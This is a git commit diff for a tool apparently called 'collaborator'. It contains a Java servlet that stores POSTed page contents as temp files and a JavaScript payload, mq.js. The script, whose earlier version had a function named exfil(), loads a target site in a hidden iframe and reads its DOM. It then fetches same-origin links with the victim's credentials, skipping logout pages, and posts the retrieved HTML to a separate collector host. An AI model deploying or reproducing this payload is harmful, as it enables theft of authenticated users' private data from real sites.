7164e7502a8b94ef8043a983a3a0f095f96ed594
di229 <169496356+di229@users.noreply.github.com>
2025-12-11 22:43:39 +0000

    collect links and custom files in mq.js. save as files in servlet

--- collaborator/app/src/main/java/org/example/DynamicCollaboratorServlet.java
+++ collaborator/app/src/main/java/org/example/DynamicCollaboratorServlet.java
@@ -3,10 +3,15 @@ package org.example;
 import java.io.BufferedInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.FileInputStream;
+import java.io.FileOutputStream;
 import java.io.IOException;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Path;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.regex.Pattern;
+import java.util.zip.CRC32;
 
 import jakarta.servlet.ServletOutputStream;
 import jakarta.servlet.annotation.WebServlet;
@@ -20,7 +25,7 @@ import jakarta.servlet.http.HttpServletResponse;
 public class DynamicCollaboratorServlet extends HttpServlet {
 
 	private static final long serialVersionUID = 1L;
-	private Map<String, String> pageDb = new HashMap<>();
+	private Map<String, byte[]> pageDb = new HashMap<>();
 	
 	protected void doGet(HttpServletRequest req, HttpServletResponse resp)
 			throws IOException {
@@ -31,12 +36,13 @@ public class DynamicCollaboratorServlet extends HttpServlet {
 			resp.setContentType("text/javascript; encoding=UTF-8");
 			ByteArrayOutputStream bos = new ByteArrayOutputStream();
 			ServletOutputStream out = resp.getOutputStream();
-			BufferedInputStream bis = new BufferedInputStream(new FileInputStream("static/mq.js"));
-			int val = 0;
 			int size = 0;
-			while ((val = bis.read()) != -1) {
-				 bos.write(val);
-				 size++;
+			try (BufferedInputStream bis = new BufferedInputStream(new FileInputStream("static/mq.js"))) {
+				int val = 0;
+				while ((val = bis.read()) != -1) {
+					 bos.write(val);
+					 size++;
+				}
 			}
 			resp.setContentLength(size);
 			bos.writeTo(out);
@@ -46,7 +52,7 @@ public class DynamicCollaboratorServlet extends HttpServlet {
 	protected void doPost(HttpServletRequest req, HttpServletResponse resp) {
 		if ("/mq".compareTo(req.getServletPath()) == 0) {
 			String pageName = req.getParameter("page");
-			String contents = req.getParameter("contents");
+			byte[] contents = req.getParameter("contents").getBytes(StandardCharsets.UTF_8);
 			String key = req.getParameter("key");
 			if (pageName.length() > 7 && pageName.substring(0, 7).compareTo("http://") == 0) {
 				pageName = pageName.substring(7);
@@ -57,14 +63,40 @@ public class DynamicCollaboratorServlet extends HttpServlet {
 					+ "." + pageName.replace('.', '_').replace('/', '.');
 			if (key != "" && !pageDb.containsKey(dbkey)) {
 				pageDb.put(dbkey, contents);
-				System.out.println("dbkey:" + dbkey + "; contents: " + contents);
+				System.out.println("putting dbkey:" + dbkey);
 			} else {
 
 			}
 		}
+
 		if ("/mq.dump".compareTo(req.getServletPath()) == 0) {
-			for (Map.Entry<String, String> e : pageDb.entrySet()) {
-				System.out.println(e.getKey() + ":" + e.getValue());
+			String tmpdir = System.getProperty("java.io.tmpdir");
+			for (Map.Entry<String, byte[]> e : pageDb.entrySet()) {
+				String[] parts = e.getKey().split("\\.");
+				Path dest = Path.of(tmpdir);
+				for (String p : parts) {
+					if (!p.isEmpty()) {
+						dest = dest.resolve(p);
+					}
+				}
+				try {
+					Files.createDirectories(dest);
+				} catch (IOException ex) {
+					ex.printStackTrace();
+					continue;
+				}
+				byte[] contents = e.getValue();
+				CRC32 crc = new CRC32();
+				crc.update(contents);
+				dest = dest.resolve(Long.toString(crc.getValue()));
+				if (!Files.exists(dest)) {
+					try (FileOutputStream fos = new FileOutputStream(dest.toFile())) {
+						fos.write(contents);
+						System.out.println("File " + dest + " written " + contents.length + " bytes");
+					} catch (IOException ex){
+						ex.printStackTrace();
+					}
+				}
 			}
 		}
 	}
--- collaborator/app/static/mq.js
+++ collaborator/app/static/mq.js
@@ -1,29 +1,80 @@
-async function exfil() {
-	const doc = document.getElementById("mqif.000").contentDocument;
+async function sendmqif(frame, key) {
+	const doc = frame.contentDocument;
 	if (doc) {
 		const de = doc.documentElement;
 		if (de) {
-			const res = await fetch("http://127.0.2.1:8080/cd/mq", {
-				method: "POST",
-				headers: {
-				    "Content-Type": "application/x-www-form-urlencoded",
-				  },
-				body: new URLSearchParams({
-					key: "mq13",
-					page: doc.location.href,
-					contents: de.innerHTML,
-				}),
-			});
+			await sendit(key, doc.location.href, de.innerHTML);
 		}
 	}
 }
 
-let body = document.getElementsByTagName("body")[0];
+async function sendlinks(frame, key, predicate) {
+	let links = frame.contentDocument.getElementsByTagName("a");
+	let hrefs = [];
+	for (let i=0; i<links.length; i++) {
+		hrefs.push(links[i].href);
+	}
+	console.log(hrefs);
+	hrefs.filter(predicate).forEach((href) => {
+		let get = fetch(href, {
+			credentials: "include"
+		})
+		.then((r) => r.text())
+		.then((contents) =>	sendit(key, href, contents));
+	});
+}
+
+async function sendit(key, href, html) {
+	console.log("sending href " + href);
+	return fetch("http://127.0.2.1:8080/cd/mq", {
+		method: "POST",
+		headers: {
+		    "Content-Type": "application/x-www-form-urlencoded",
+		  },
+		body: new URLSearchParams({
+			key: key,
+			page: href,
+			contents: html,
+		}),
+	});
+}
+
+async function sendcustomrefs(key, hrefs) {
+	hrefs.forEach((h) => {
+		fetch(origin + h, {
+			credentials: "include"
+		})
+		.then((r) => r.text())
+		.then((contents) =>	sendit(key, origin + h, contents));
+	})
+}
+
+async function sleep() {
+	await new Promise((r) => setTimeout(r, 20000));
+}
+
 // https://stackoverflow.com/questions/25098021/securityerror-blocked-a-frame-with-origin-from-accessing-a-cross-origin-frame
 // iframe src must match origin in all sane browsers
-body.innerHTML = "<iframe id=\"mqif.000\" src=\"https://127.0.3.2:8443/\"></iframe>";
-let frame = document.getElementById("mqif.000");
+let origin = "https://127.0.3.2:8443/";
+let frame = document.createElement("iframe");
+frame.src = origin;
+frame.setAttribute("style","display:none");
 frame.addEventListener("load", function () {
 	console.log("ready");
-	exfil();
+	setTimeout( function () {
+		sendmqif(frame, "mq18");
+		sendlinks(frame, "mq18", (h) => {
+			// ignore other origins, possible logout pages and links back to the page root
+			if (h.lastIndexOf(origin) == 0 && h.toLowerCase().lastIndexOf("logout") == -1 &&
+					h.toLowerCase().lastIndexOf("logoff") == -1 &&
+					h.length > origin.length ) {
+				return true;
+			}
+			return false;
+		});
+		sendcustomrefs("mq18", [])
+	}, 3000);
 })
+
+let body = document.getElementsByTagName("body")[0];
+body.appendChild(frame);
